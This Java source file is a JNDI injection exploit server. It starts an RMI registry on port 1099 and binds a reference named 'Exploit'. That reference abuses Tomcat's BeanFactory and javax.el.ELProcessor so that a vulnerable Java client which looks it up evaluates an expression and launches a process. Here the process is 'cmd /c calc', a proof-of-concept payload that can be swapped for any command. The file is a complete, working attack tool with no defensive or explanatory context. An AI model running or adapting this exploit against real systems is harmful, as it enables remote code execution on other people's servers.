import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RmiServer {
    public static void main(String[] args) throws Exception {
        lanuchRMIregister(1099);
    }

    public static void lanuchRMIregister(Integer rmi_port) throws Exception {

        System.out.println("Creating RMI Registry, RMI Port:"+rmi_port);
        Registry registry = LocateRegistry.createRegistry(rmi_port);
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "aaa=eval"));
        ref.add(new StringRefAddr("aaa", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd','/c','calc']).start()\")"));

        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind(" Exploit", referenceWrapper);
        System.out.println(referenceWrapper.getReference());
    }
}
